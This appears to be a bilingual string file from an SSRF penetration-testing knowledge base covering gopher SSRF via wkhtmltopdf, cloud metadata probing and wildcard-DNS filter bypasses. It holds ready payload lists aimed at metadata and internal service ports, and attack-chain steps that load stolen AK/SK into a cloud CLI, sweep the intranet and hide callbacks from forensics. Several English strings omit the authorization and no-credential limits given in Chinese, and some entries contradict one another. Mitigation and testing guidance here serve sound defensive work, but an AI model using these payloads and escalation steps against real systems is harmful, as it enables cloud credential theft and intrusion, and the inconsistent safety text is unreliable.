opsecTips.zh: gopher 帧只发往自有只记录字节的 TCP sink：INFO/flushall 等样例帧仅作字节回放对照，sink 不执行任何命令；禁止触达真实 Redis、数据库端口或任何共享服务。出现非测试字节、服务响应、持久连接、端口扫描或渲染异常时停止。
opsecTips.en: Gopher testing sends a harmless token only and forbids INFO, flushall, database protocols, and real ports; stop on nontest bytes, service responses, persistent connections, port scanning, or render anomalies.

opsecTips.zh: 关闭 TCP sink 和连接，删除 HTML/PDF/token，清理渲染任务与网络日志，重启 renderer 并确认无延迟重试。
opsecTips.en: Close the TCP sink and connections, delete HTML, PDF, and tokens, clear render jobs and network logs, restart the renderer, and confirm no delayed retries.

description.zh: 绕过只过滤 iframe src 的 gopher 特征：把协议 URL 转移到 img 资源属性；Redis 端收到 INFO 命令即成功。
description.en: Move the gopher URL into an image resource attribute to bypass iframe-focused filtering; Redis receiving the INFO command confirms success.

description.zh: 绕过静态属性扫描：由脚本运行时发起协议请求；目标端口出现连接记录即成功。
description.en: Initiate the protocol request at runtime from script to bypass static attribute scanning; a connection recorded on the target port confirms success.

description.zh: 绕过对全小写 gopher:// 前缀的匹配：协议头大写化后解析器仍识别；Redis 收到指令即成功。
description.en: Uppercase the scheme against lowercase-prefix matching while parsers still accept it; Redis receiving the command confirms success.

title.zh: 部署字节记录模拟服务

description.zh: 在隔离网段准备无状态 TCP 服务，记录连接来源、端口和完整接收字节。
description.en: Prepare a stateless TCP service in an isolated network and record connection source, port, and complete received bytes.

title.zh: 回放 gopher 协议字节

description.zh: 提交原始 gopher 资源并比较 URL 解码结果与模拟服务实际收到的协议内容。
description.en: Submit the original gopher resources and compare URL-decoded data with protocol content received by the mock service.

description.zh: 仅允许公共 HTTP/HTTPS 并阻断内网后重放，确认正常渲染保留且模拟器不再收到连接。
description.en: Replay after allowing only public HTTP and HTTPS and blocking internal egress, preserving normal rendering without mock-service connections.

overview.zh: wkhtmltopdf gopher 协议 SSRF 覆盖渲染器非 HTTP 协议转发场景：针对接收用户 HTML 的 wkhtmltopdf 服务，验证 gopher: 资源能否把受控字节发往内网 Redis、数据库等 TCP 端口。验证维度涵盖 RESP 命令帧构造与多协议端口转发两类变体。
overview.en: wkhtmltopdf Gopher-Scheme SSRF covers non-HTTP protocol forwarding by the renderer: for wkhtmltopdf services accepting user HTML, verify whether gopher: resources can push controlled bytes to intranet Redis, database, and other TCP ports. Verification dimensions cover RESP command-frame construction and multi-protocol port forwarding variants.

vulnerability.zh: 根因是渲染器或其 URL 库允许非业务协议时，HTML 资源 URL 即可变成任意协议客户端；gopher 把解码后字节直接写入 TCP 连接，隔离缺失时 flushall 等破坏性片段可能触达真实共享服务。
vulnerability.en: The root cause is non-business schemes permitted by the renderer or its URL library, turning HTML resource URLs into arbitrary protocol clients; gopher writes decoded bytes straight into the TCP connection, and without isolation destructive fragments such as flushall can reach real shared services.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在隔离网络启动只记录字节的 Redis/TCP 模拟器并建立普通 HTTP 资源基线；随后逐条渲染 gopher iframe（INFO 帧、RESP 命令与各数据库端口），模拟器收到对应端口的原始连接与解码字节即确认协议级 SSRF；严禁把 flushall 等破坏性片段发向真实共享 Redis；最后禁用 gopher 并阻断内网网段复测防护。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 starts a byte-recording Redis/TCP emulator on an isolated network and establishes an ordinary HTTP resource baseline; then render gopher iframes one by one (INFO frames, RESP commands, and database ports) — raw connections with decoded bytes at the corresponding ports confirm protocol-level SSRF; never send destructive fragments like flushall to real shared Redis; finally retest protection with gopher disabled and intranet ranges blocked. Replace placeholders via the global variables menu.

mitigation.zh: 在解析器入口只允许 http/https 并拒绝协议混淆，在网络层阻断渲染容器到私网、回环与管理端口；对 URL 解码后目标再次校验，渲染沙箱以只读、无凭据身份运行。修复后用第 1 步样例回归，gopher 资源应全部被拒绝。
mitigation.en: Allow only http/https at the parser entrance and reject scheme confusion; block renderer-container access to private, loopback, and management ports at the network layer; revalidate decoded URL targets and run the render sandbox read-only without credentials. After the fix, regress with the step 1 sample: every gopher resource must be denied.

name.zh: SSRF 带外回调关联验证

description.zh: 保留原始外部主机 URL，用于说明如何以自有唯一令牌域替换静态第三方名称并关联服务端 DNS/HTTP 回调。
description.en: Preserves the original external-host URL to show how a static third-party name must be replaced by a controlled unique-token domain for server-side DNS or HTTP callback correlation.

prerequisites.zh: 测试者控制权威 DNS 与 HTTPS 回调端点，并能为每个请求签发不可复用令牌
prerequisites.en: The tester controls authoritative DNS and an HTTPS callback endpoint and can issue a nonreusable token for each request.

prerequisites.zh: 原始 burpcollaborator.net 主机不会直接请求，应用请求 ID 与回调时间窗已定义
prerequisites.en: The original burpcollaborator.net host will not be requested directly, and the application request ID and callback time window are defined.

description.zh: 该原始静态域仅供追溯。执行时必须替换为 `<request-id>.<owned-zone>` 并优先使用 HTTPS，禁止向不受控第三方发送请求。
description.en: This original static domain is retained only for traceability. Replace it with <request-id>.<owned-zone> and prefer HTTPS during execution; never send requests to an uncontrolled third party.

analysis.zh: 最强证据是唯一令牌对应的应用源 HTTP/TLS 请求，并能和同一提交 ID 关联。带唯一令牌的 DNS 回调可确认解析级盲 SSRF，但不足以证明发起了完整 HTTP 请求；公共静态域日志、非唯一令牌或操作者浏览器请求不能作为证据。结论必须标注证据层级（DNS 层/HTTP 层）。
analysis.en: The strongest evidence is an application-origin HTTP or TLS request carrying the unique token and correlated to the same submission ID. DNS alone, public static-domain logs, nonunique tokens, or operator-browser requests cannot confirm blind SSRF; the evidence layer must be stated.

opsecTips.zh: 每次只签发一个短期域名并限制单次 DNS/HTTP 事件；收到应用源回调即停止
opsecTips.en: Issue one short-lived domain per run and limit it to a single DNS or HTTP event; stop when an application-origin callback arrives.

opsecTips.zh: 测试结束撤销 DNS、TLS 证书路由和令牌映射，按保留策略清理包含出口地址的日志
opsecTips.en: At completion revoke DNS, TLS certificate routing, and token mappings, and clean logs containing egress addresses under the retention policy.

description.zh: 绕过对公共回调域名的封禁：为每次探测生成唯一子域标签做关联；DNS 查询携带该标签到达即成功。
description.en: Generate a unique subdomain label per probe for correlation past blocked public collab domains; a DNS query carrying the label arriving confirms success.

description.zh: 绕过仅审计明文 HTTP 出网的规则：改走 TLS 回调隐藏路径与参数；监听端收到 TLS 握手即成功。
description.en: Move the callback to TLS so egress path and parameters are hidden from HTTP-only auditing; a TLS handshake reaching the listener confirms success.

description.zh: 绕过对单一回调域名的黑名单：轮换备用公共带外交互域；任一域名收到回连即成功。
description.en: Rotate alternate public interaction domains past single-domain blacklists; a callback on any of them confirms success.

description.zh: 把随机子域绑定到应用请求 ID、操作者和短时间窗，并清空此前日志基线。
description.en: Bind a random subdomain to the application request ID, operator, and short time window, and clear the prior log baseline.

title.zh: 替换静态域并单次提交
title.en: Replace the static domain and submit once

description.zh: 保持 URL 输入位置不变，仅将原始域替换为自有令牌域，且不触发第二次请求。
description.en: Keep the URL input location unchanged, replace only the original domain with the controlled token domain, and do not trigger a second request.

title.zh: 关联 DNS、TLS 与 HTTP 事件
title.en: Correlate DNS, TLS, and HTTP events

description.zh: 按令牌、时间、出口地址和协议层关联证据，排除操作者客户端与自动扫描。
description.en: Correlate evidence by token, time, egress address, and protocol layer while excluding operator clients and automated scanners.

title.zh: 阻断任意出站并撤销令牌
title.en: Block arbitrary egress and revoke the token

description.zh: 应用允许列表与出站控制后重放一次，确认无回调，再使子域失效并删除临时日志。
description.en: After applying allowlists and egress controls, replay once to confirm no callback, then invalidate the subdomain and remove temporary logs.

overview.zh: SSRF 带外回调关联验证覆盖盲 SSRF 取证场景：针对不返回获取结果但可能仍发起 DNS 或 HTTP 请求的应用，验证以自有唯一令牌域名关联服务端回调的方法。验证维度涵盖每请求唯一子域生成、DNS/TLS/HTTP 三层日志关联与假阳性剔除。
overview.en: SSRF Out-of-Band Callback Correlation covers blind-SSRF forensics: for applications that return no fetch result yet may still issue DNS or HTTP requests, verify the method of correlating server callbacks via owned unique token domains. Verification dimensions cover per-request unique subdomains, DNS/TLS/HTTP three-layer log correlation, and false-positive removal.

vulnerability.zh: 根因是用户 URL 能驱动服务端解析或连接任意外部主机时，盲 SSRF 可经带外回调证实；静态公共域名无法可靠归因，只有 DNS 查询还可能是预解析、扫描器或中间件行为，必须以唯一令牌与来源约束证据。
vulnerability.en: The root cause is that when a user URL drives server-side resolution or connections to arbitrary external hosts, blind SSRF is provable through out-of-band callbacks; static public domains cannot attribute reliably, and DNS-only hits may be pre-resolution, scanners, or middleware — evidence requires unique tokens and source constraints.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步为单次应用请求生成随机子域 `<request-id>.<owned-zone>` 并记录请求 ID、提交时间与预期窗口；随后在权威 DNS、TLS 与 HTTP 日志中检索该令牌，阳性至少要求令牌唯一且来源属于应用出口 IP 段；本地浏览器解析、邮件扫描或旧令牌重放必须剔除。优先使用 HTTPS。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 generates a random subdomain `<request-id>.<owned-zone>` per application request, recording the request ID, submission time, and expected window; then search authoritative DNS, TLS, and HTTP logs for the token — a positive requires a unique token with a source in the application's egress ranges; exclude local browser resolution, mail scanning, and stale-token replays. Prefer HTTPS. Replace placeholders via the global variables menu.

mitigation.zh: 获取功能采用目的地主机允许列表、解析后 IP 分类、重定向复检和受限出站代理，不需要联网的工作负载直接禁止外连；保留回归域验证合法业务目标可达而任意令牌域不可达。修复后用第 1 步样例回归，回调应消失。
mitigation.en: Give the fetch function a destination-host allowlist, resolved-IP classification, redirect rechecks, and a restricted egress proxy, and deny all egress for workloads that need no networking; keep a regression domain proving legitimate business targets resolve while arbitrary token domains do not. After the fix, regress with the step 1 sample: callbacks must disappear.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: 多云实例元数据 SSRF 探测

description.zh: 覆盖 AWS、Google Cloud、Azure 与腾讯云元数据路径，验证服务端请求是否能到达链路本地凭据和实例信息端点。
description.en: Covers AWS, Google Cloud, Azure, and Tencent Cloud metadata paths to test whether server-side requests reach link-local credential and instance-information endpoints.

prerequisites.zh: 已根据资产配置确认实际云平台与隔离测试实例，禁止跨 AWS、GCP、Azure、腾讯云批量尝试。
prerequisites.en: Confirm the actual cloud platform and isolated test instance from the asset inventory; do not batch-test AWS, GCP, Azure, and Tencent Cloud.

prerequisites.zh: 选择仅返回实例 ID 等非敏感字段的路径，配置平台要求的令牌/请求头，并启用出站与元数据访问日志。
prerequisites.en: Choose a path returning only a nonsensitive field such as instance ID, configure required tokens or headers, and enable egress and metadata-access logging.

description.zh: 逐条请求多云元数据端点并记录响应与日志差异；成功时任一平台端点返回元数据字段，即确认实例元数据可被 SSRF 读取。
description.en: Request each multi-cloud metadata endpoint and record response and log differences; any platform endpoint returning metadata fields confirms instance metadata readable via SSRF.

analysis.zh: 阳性是应用服务器携带正确平台前置条件访问元数据端点并返回固定非敏感字段。公网模拟页面、DNS 解析到 metadata 主机、401/403、或仅观察链路本地连接失败均是假阳性；不得以获取凭据作为验证标准。
analysis.en: Positive evidence is the application server reaching the metadata endpoint with platform prerequisites and returning a fixed nonsensitive field. Public simulations, metadata hostname resolution, 401 or 403, and failed link-local connections are false positives; credential retrieval is not a validation criterion.

opsecTips.zh: 收到一个非敏感实例字段后立即停止，不访问 IAM 凭据、user-data、OAuth token 或 Kubernetes 配置。
opsecTips.en: Stop immediately after receiving one nonsensitive instance field and do not access IAM credentials, user data, OAuth tokens, or Kubernetes configuration.

opsecTips.zh: 清理请求日志中的实例标识，撤销临时测试角色/令牌，确认没有缓存元数据响应或自动重试。
opsecTips.en: Redact instance identifiers from request logs, revoke temporary test roles or tokens, and verify no metadata response cache or automatic retry remains.

description.zh: 绕过对 169.254.169.254 明文黑名单：链路本地地址转 32 位整数；返回 IAM 角色信息即成功。
description.en: Convert the link-local metadata address to an integer past plaintext blacklists; returned IAM role information confirms success.

description.zh: 绕过对无尾点主机名的精确匹配：加尾点后 DNS 等价解析；带 Header 请求返回实例元数据即成功。
description.en: Append the DNS-equivalent trailing dot past exact hostname matching; a Header-bearing request returning instance metadata confirms success.

description.zh: 绕过对 AWS 标准元数据地址的单点封禁：轮换阿里云/Oracle 等备用元数据端点；任一返回实例信息即成功。
description.en: Rotate alternate cloud metadata endpoints past AWS-specific blocking; any endpoint returning instance information confirms success.

description.zh: 在书面授权的红队场景提交 http://169.254.169.254/.../ecs-instance-role/ 凭证路径并仅确认可达性（返回角色名或凭据键名即证明实例凭证可被 SSRF 拖取）；验证类测试不读取 AccessKeyId 正文，影响以路径可达性外推。
description.en: Submit the ecs-instance-role credentials path on 169.254.169.254; AccessKeyId fields in the response mean instance credentials are directly stealable.

title.zh: 轮换多云端点定位环境
title.en: Rotate endpoints to fingerprint the cloud

description.zh: 依次替换为各云厂商的元数据地址与所需请求头重放；返回有效 JSON 的端点即锁定实际云平台与其防护形态。
description.en: Swap in each vendor's metadata address and required headers; whichever returns valid JSON pins the actual cloud and its defenses.

title.zh: 凭证横向进入云控制面
title.en: Pivot into the cloud control plane

description.zh: 将第 1 步 AK/SK 配入云 CLI；能列出存储桶或扮演目标角色即从实例凭证升级为云账号级控制。
description.en: Load the step-1 AK/SK into the cloud CLI; listing buckets or assuming roles upgrades instance credentials to account-level control.

overview.zh: 多云实例元数据 SSRF 探测覆盖云元数据访问场景：针对服务端 URL 获取功能，验证请求能否到达 AWS、GCP、Azure 与腾讯云的链路本地元数据端点。验证维度涵盖各平台必需主机名、路径、请求头与版本参数的逐平台验证及凭据正文的排除处理。
overview.en: Multi-Cloud Instance-Metadata SSRF Probes covers cloud metadata access: for server-side URL fetching, verify whether requests reach the link-local metadata endpoints of AWS, GCP, Azure, and Tencent Cloud. Verification dimensions validate each platform's required hostname, path, headers, and version parameters per platform, excluding credential bodies.

vulnerability.zh: 根因是应用可访问用户指定 URL 且出站网络允许链路本地元数据服务，未强制 IMDSv2、Metadata-Flavor 等平台防护时实例身份与角色信息即可被读取；各平台要求不同，必须先确认实际云环境再选择对应样例。
vulnerability.en: The root cause is the application fetching user-specified URLs while egress networking permits link-local metadata services; without platform protections such as IMDSv2 or Metadata-Flavor enforced, instance identity and role information become readable. Platform requirements differ, so confirm the actual cloud environment before selecting samples.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先确认目标所属云平台与授权范围；再在克隆或隔离云实例中只选择对应平台的无敏感路径（如 instance-id、project-id），补齐必需请求头并记录出站连接，不请求凭据正文；元数据服务日志、出站代理与固定非敏感字段共同证明访问成立。不要把多平台 URL 批量发送。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first identifies the target's cloud platform and authorization scope; then, on a cloned or isolated cloud instance, choose only the platform's non-sensitive paths (e.g., instance-id, project-id), add required headers, and record egress connections without requesting credential bodies; metadata-service logs, the egress proxy, and fixed non-sensitive fields jointly prove access. Never batch-send multi-platform URLs. Replace placeholders via the global variables menu.

mitigation.zh: 阻断链路本地出站，使用 URL 允许列表与出站代理；强制各云平台最新元数据保护（IMDSv2、Metadata-Flavor 等）并为实例配置最小角色，监控元数据路径请求。修复后用同一正常、阳性和阴性样例回归，元数据端点访问被网络层拒绝。
mitigation.en: Block link-local egress and apply URL allowlists with an outbound proxy; enforce each cloud platform's latest metadata protections (IMDSv2, Metadata-Flavor, etc.), assign minimal instance roles, and monitor metadata-path requests. After the fix, regress with the same positive, negative, and normal samples: metadata endpoint access denied at the network layer.

name.zh: nip.io 通配 DNS SSRF 目标

description.zh: 使用把 IPv4 嵌入主机名的 nip.io 域名指向回环、链路本地和私网服务，测试主机名允许列表缺口。
description.en: Uses nip.io hostnames embedding IPv4 addresses to resolve to loopback, link-local, and private services and test hostname-allowlist gaps.

subCategory.zh: 地址变形与 DNS 解析绕过

prerequisites.zh: 已从 nip.io 官方实现和实时 DNS 查询确认嵌入 IPv4 的主机名当前解析规则。
prerequisites.en: Confirm current embedded-IPv4 hostname resolution from the nip.io implementation and live DNS queries.

prerequisites.zh: 选择一个解析到受控回环服务的 URL，并能记录 A/AAAA、TTL、最终连接 IP 与请求令牌。
prerequisites.en: Choose one URL resolving to a controlled loopback service and record A or AAAA answers, TTL, final IP, and request token.

title.en: Validation step 1 for nip.io Wildcard-DNS SSRF Targets

description.zh: 逐条请求 nip.io 通配域名并记录解析与响应；成功时域名解析到嵌入 IP 并返回对应服务内容。
description.en: Request each nip.io wildcard domain and record resolution and responses; the domain resolving to the embedded IP with the service content returned confirms success.

analysis.zh: 阳性是主机字符串绕过表面规则后，应用最终连接 nip.io 解析出的内网/回环标记服务。只获得 A 记录、访问 nip.io 公共页面、连接被防火墙拒绝或浏览器发起请求都是假阳性。
analysis.en: Positive evidence is the application connecting to the internal or loopback marker resolved through nip.io after bypassing a superficial host rule. An A record alone, the nip.io landing page, firewall rejection, or a browser-originated request is false positive.

opsecTips.zh: 一个 nip.io 主机成功到达标记端口后停止，不遍历数据库、Kubernetes 或元数据端口列表。
opsecTips.en: Stop after one nip.io host reaches the marker port; do not enumerate database, Kubernetes, or metadata ports.

opsecTips.zh: 关闭标记服务并清理 DNS/HTTP 缓存，删除访问日志中的完整内网 URL 和令牌。
opsecTips.en: Shut down the marker service, clear DNS and HTTP caches, and remove full internal URLs and tokens from access logs.

description.zh: 绕过对点分嵌入 nip.io 形式的匹配：短横线形式解析等价；内网服务响应出现即成功。
description.en: Use the dash form that resolves identically past dotted-embedding matching; an internal service response appearing confirms success.

description.zh: 绕过对全小写通配域名的规则：域名部分大写，DNS 不区分大小写；元数据返回即成功。
description.en: Uppercase the domain against lowercase wildcard rules since DNS is case-insensitive; returned metadata confirms success.

description.zh: 绕过对"IP 开头域名"直接判定的过滤：加业务风格前缀子域；解析仍指向目标地址即成功。
description.en: Prepend a business-style subdomain so the hostname no longer starts with an IP; resolution still pointing at the target confirms success.

description.zh: 绕过对点分 sslip.io 形式特征的匹配：短横线写法等价解析；内网设备页面返回即成功。
description.en: Use the dash notation that resolves identically past dotted-form signatures; an internal device page returning confirms success.

description.zh: 绕过对十进制 IP 段的规则：十六进制形式同样被通配解析；目标端口响应差异可辨即成功。
description.en: Use hex forms still matched by the wildcard against decimal-range rules; distinguishable target port responses confirm success.

description.zh: 绕过对紧凑十进制匹配：补零形式解析等价；网关管理页可达即成功。
description.en: Use zero-padded forms that resolve identically against compact decimal matching; a reachable gateway admin page confirms success.

title.en: Validation step 1 for sslip.io Wildcard-DNS SSRF Targets

wafBypass.command:
http://169.254.169.254.sslip.io
http://192.168.1.1.sslip.io
http://10.0.0.1.sslip.io
http://172.16.0.1.sslip.io
http://0.0.0.0.sslip.io
http://127.0.0.1.sslip.io:8080
http://169.254.169.254.sslip.io:80
http://192.168.1.1.sslip.io:3306
http://10.0.0.1.sslip.io:6379
http://127.0.0.1.sslip.io/latest/meta-data/
http://169.254.169.254.sslip.io/latest/meta-data/
http://127.0.0.1.sslip.io:80
http://127.0.0.1.sslip.io:443
http://127.0.0.1.sslip.io:3306
http://127.0.0.1.sslip.io:6379
http://127.0.0.1.sslip.io:27017

description.zh: 逐条请求 sslip.io 通配域名并记录解析与响应；成功时域名解析到嵌入 IP 并返回对应服务内容。
description.en: Request each sslip.io wildcard domain and record resolution and responses; the domain resolving to the embedded IP with the service content returned confirms success.

description.zh: 提交 http://169.254.169.254.nip.io；域名解析回链路本地地址且返回元数据目录即绕过对纯 IP 的过滤。
description.en: Submit http://169.254.169.254.nip.io; the domain resolving to the link-local address and returning metadata bypasses the plain-IP filter.

title.en: Reuse the trick to sweep the intranet

description.zh: 在授权渗透范围内把前缀替换为 10.0.0.x、127.0.0.1 等地址逐一提交，按响应差异测绘内网，全程使用同一域名形态；验证类测试以单个受控标记地址一次命中为限，不做批量遍历。
description.en: Swap the prefix to 10.0.0.x or 127.0.0.1 hosts and submit; response differences map the intranet while every request wears a domain shape.

description.zh: 在授权渗透范围内沿 /latest/meta-data/iam/security-credentials/ 深入请求以证明影响（返回角色名或临时凭据键名即表明可进入云控制面）；验证类测试以标记命中与非敏感字段为限，不读取 AK/SK 正文。
description.en: Walk into /latest/meta-data/iam/security-credentials/; AK/SK in hand enters the cloud control plane as the instance.

overview.zh: nip.io 通配 DNS SSRF 目标覆盖通配域名绕过场景：针对按主机名后缀或字面规则过滤的取回功能，验证把 IPv4 嵌入主机名的 nip.io 域名能否解析到回环、链路本地与私网服务。验证维度涵盖十二个嵌入 IP 域名的解析与请求对照。
overview.en: nip.io Wildcard-DNS SSRF Targets covers wildcard-domain bypass: for fetchers filtering by hostname suffix or literal rules, verify whether nip.io domains embedding IPv4 resolve to loopback, link-local, and private services. Verification dimensions compare resolution and requests across twelve embedded-IP domains.

vulnerability.zh: 根因是校验只检查主机字符串后缀或拒绝 IP 字面量，却未解析并分类 DNS 结果，通配 DNS 因此把看似合法的域名绑定到内部目标；域名文本与解析后地址的分离是所有通配 DNS 绕过的共同缺口。
vulnerability.en: The root cause is validation inspecting only the host string suffix or rejecting IP literals without resolving and classifying DNS answers, so wildcard DNS binds seemingly legitimate names to internal targets; the split between name text and resolved address is the shared gap of all wildcard-DNS bypasses.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先离线查询 169.254.169.254.nip.io、192.168.1.1.nip.io 等域名的 A/AAAA 与 TTL，确认嵌入地址与解析结果一致；再由应用请求一个固定标记路径并捕获最终连接 IP，受控内网服务日志与 HTTP 客户端连接地址一致即确认绕过成立。DNS 成功或公共服务页面都不是证据。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first queries A/AAAA and TTLs offline for domains like 169.254.169.254.nip.io and 192.168.1.1.nip.io, confirming embedded addresses match resolutions; then have the application request one fixed marker path and capture the final connected IP — agreement between the intranet service's log and the HTTP client's connection address confirms the bypass. DNS success or a public service page is not evidence. Replace placeholders via the global variables menu.

mitigation.zh: 对解析后的所有地址执行网段阻断，避免基于字符串后缀允许 URL，并在每次重定向和 DNS 刷新后重新校验。修复后用同一正常、阳性和阴性样例回归：通配域名目标被拒绝，合法域名保留。
mitigation.en: Apply network-range blocking to all resolved addresses, avoid allowing URLs by string suffix, and revalidate after every redirect and DNS refresh. After the fix, regress with the same positive, negative, and normal samples: wildcard-domain targets denied, legitimate names preserved.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: 1u.ms 编码地址 DNS SSRF 目标

description.zh: 使用 1u.ms 通配符 DNS 服务的 make-<点分IP>-rr 记录格式（如 make-127-0-0-1-rr.1u.ms 解析为 127.0.0.1），验证主机字符串检查是否忽略最终 DNS 目标。
description.en: Uses the 1u.ms wildcard DNS service's make-<dotted-ip>-rr record format (e.g. make-127-0-0-1-rr.1u.ms resolving to 127.0.0.1) to test whether hostname checks ignore the final DNS destination.

subCategory.zh: 地址变形与 DNS 解析绕过

prerequisites.zh: 当前 1u.ms 对点分地址与十六进制标签的解析已通过独立 DNS 工具核对。
prerequisites.en: Verify current 1u.ms handling of dotted addresses and hexadecimal labels with an independent DNS tool.

prerequisites.zh: 使用一个受控目标地址，且可观察服务端校验值、DNS 答案和最终连接三者。
prerequisites.en: Use one controlled target address and observe the server's validated value, DNS answer, and final connection.

title.en: Validation step 1 for 1u.ms Encoded-Address DNS SSRF Targets

execution.command:
http://make-127-0-0-1-rr.1u.ms
http://make-169-254-169-254-rr.1u.ms
http://make-192-168-1-1-rr.1u.ms
http://make-10-0-0-1-rr.1u.ms
http://make-172-16-0-1-rr.1u.ms
http://make-0-0-0-0-rr.1u.ms

description.zh: 逐条请求 1u.ms 编码域名并记录解析与响应；成功时 make-* 域名按规则解析到目标地址并返回内容。
description.en: Request each 1u.ms encoded domain and record resolution and responses; the make-* domains resolving to the target address per the rule with content returned confirms success.

analysis.zh: 阳性是编码外观域名通过字符串校验，但解析结果属于禁止网段并被应用连接。域名格式包含十六进制、DNS 返回 NXDOMAIN/多地址、或离线换算出内网 IP而没有 socket 连接都属假阳性。
analysis.en: Positive evidence is a domain-looking encoded host passing string validation, resolving into a blocked range, and being connected by the application. Hex-looking labels, NXDOMAIN or multiple answers, or offline conversion without a socket connection are false positives.

opsecTips.zh: 确认一个编码域名到达受控服务后停止，不对六个样例逐个打真实地址。
opsecTips.en: Stop after one encoded hostname reaches the controlled service; do not send all six samples to real addresses.

opsecTips.zh: 删除测试 DNS 查询记录中的内部地址，清除解析/连接缓存并关闭标记监听器。
opsecTips.en: Remove internal addresses from test DNS records, clear resolver and connection caches, and close the marker listener.

description.zh: 绕过对单一 make 前缀模式的检测：一条域名在两地址间轮转解析；两次请求命中不同目标即成功。
description.en: Rotate resolution between two addresses within one domain past single-prefix detection; two requests hitting different targets confirm success.

description.zh: 绕过对十进制短横线形式的规则：十六进制构造同样被解析；回环/元数据内容返回即成功。
description.en: Build targets hexadecimally, still parsed by the service, against dash-decimal rules; loopback or metadata content returning confirms success.

description.zh: 绕过对域名整体形态的判断：userinfo 段伪装成 CDN 域名，实际主机仍为 1u.ms；目标解析并连接成功即成功。
description.en: Disguise a decoy CDN in userinfo while the real host stays 1u.ms; successful target resolution and connection confirm success.

description.zh: 绕过按主机名黑名单的判定：同一通配域名下用端口区分内网服务；端口响应差异可辨即成功。
description.en: Distinguish internal services by port under one wildcard hostname past hostname blacklists; distinguishable port responses confirm success.

wafBypass.command: http://rebind6.{LAB_OAST}/  # 仅 AAAA 记录: 第一次 ::ffff 外部, 第二次 内部 v6

description.zh: 绕过只审计 A 记录解析的规则：用 AAAA 记录做 IPv6 侧重绑定；两次请求源地址变化即成功。
description.en: Perform v6-side rebinding via AAAA-only records against A-record auditing; source addresses changing across requests confirm success.

description.zh: 绕过对最终内网 IP 的直接特征匹配：经 CNAME 链条间接到达内网目标；网关页面返回即成功。
description.en: Reach the internal target through a CNAME cascade against direct-IP matching; a gateway page returning confirms success.

title.en: Validation step 1 for DNS Rebinding Hostname Testing

description.zh: 逐条解析重绑定服务域名并记录解析与连接行为；成功时确认各服务是否可解析，且 127-0-0-1 系列域名应解析到回环地址。
description.en: Resolve each rebinding-service domain and record resolution and connection behavior; confirming which services resolve, with the 127-0-0-1 series resolving to loopback, confirms success.

description.zh: 提交 http://make-127-0-0-1-rr.1u.ms；后缀 rr 触发轮询解析，命中 127.0.0.1 即该域名等价回环地址。
description.en: Submit http://make-127-0-0-1-rr.1u.ms; the rr suffix triggers round-robin resolution and hitting 127.0.0.1 makes the domain a loopback alias.

attackChain.payload:
http://make-127-0-0-1-rr.1u.ms
http://make-169-254-169-254-rr.1u.ms
http://make-192-168-1-1-rr.1u.ms
http://make-10-0-0-1-rr.1u.ms
http://make-172-16-0-1-rr.1u.ms
http://make-0-0-0-0-rr.1u.ms

title.zh: 利用 rr 双址回连外带
title.en: Use the rr pair for callbacks

description.zh: 域名交替解析攻击者 IP 与回环地址；外带回连与内网探测共用同一域名，取证侧只见正常的解析记录与流量。
description.en: The domain alternates between the attacker IP and loopback; callbacks and intranet probes share one domain, leaving only normal-looking resolutions behind.

title.zh: 替换编码段打击元数据

description.zh: 在授权渗透范围内把 127-0-0-1 段替换为 169-254-169-254 编码重新提交以证明升级路径（返回元数据目录或角色名即表明可达云元数据）；验证类测试仍以受控标记服务为限，不拖取角色凭据正文。
description.en: Swap the 127-0-0-1 segment for 169-254-169-254 and resubmit; reaching cloud metadata and pulling role keys escalates the attack.

overview.zh: 1u.ms 编码地址 DNS SSRF 目标覆盖编码地址通配 DNS 场景：针对按域名文本过滤的取回功能，验证 make-<点分IP>-rr.1u.ms 记录格式能否把回环、链路本地与 RFC1918 地址藏于域名后。验证维度涵盖六条编码域名的独立解析与受控标记请求。
overview.en: 1u.ms Encoded-Address DNS SSRF Targets covers encoded-address wildcard DNS: for fetchers filtering on domain text, verify whether the make-<dotted-IP>-rr.1u.ms record format hides loopback, link-local, and RFC1918 addresses behind domain names. Verification dimensions cover independent resolution of six encoded domains and controlled marker requests.

vulnerability.zh: 根因是过滤器按域名文本允许请求，HTTP 客户端随后使用 DNS 返回的受阻地址，校验对象和连接对象不一致；外部服务行为可能变化，需先独立解析并留存 TTL 再依赖结论。
vulnerability.en: The root cause is a filter allowing requests by domain text while the HTTP client then uses the blocked address DNS returns, splitting the validated object from the connection object; third-party service behavior can change, so resolve independently and retain TTLs before drawing conclusions.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先在测试解析器中查询 make-127-0-0-1-rr.1u.ms 等六个主机并记录解析结果与 TTL；再只挑一个解析到受控标记服务的样例由应用请求，记录 DNS、连接与请求令牌；解析后地址与受控服务日志双重一致即确认缺口。域名格式看似编码 IP、解析超时或 NXDOMAIN 都不能确认。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first queries the six hosts like make-127-0-0-1-rr.1u.ms in a test resolver, recording answers and TTLs; then pick one sample resolving to a controlled marker service, have the application request it, and record DNS, connection, and request token — dual agreement between the resolved address and the controlled service log confirms the gap. Name formats that merely look like encoded IPs, resolution timeouts, or NXDOMAIN do not confirm. Replace placeholders via the global variables menu.

mitigation.zh: 不要依赖域名外观，解析全部结果并做二进制地址分类；固定允许地址并通过出站代理阻断内网和元数据。修复后用同一正常、阳性和阴性样例回归：编码域名目标被拒绝，合法域名保留。
mitigation.en: Never rely on domain appearance: resolve all answers and classify addresses in binary form; pin allowed addresses and block intranet and metadata via an egress proxy. After the fix, regress with the same positive, negative, and normal samples: encoded-domain targets denied, legitimate names preserved.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: localtest.me 回环域名 SSRF 探测

description.zh: 使用解析到回环地址的 localtest.me 搭配服务端口，验证只拒绝 localhost 字符串的 SSRF 防护。
description.en: Uses localtest.me, which resolves to loopback, with service ports to test SSRF controls that reject only the localhost string.

prerequisites.zh: 已确认 localtest.me 当前解析到回环地址，并记录测试主机的 hosts/DNS 覆盖情况。
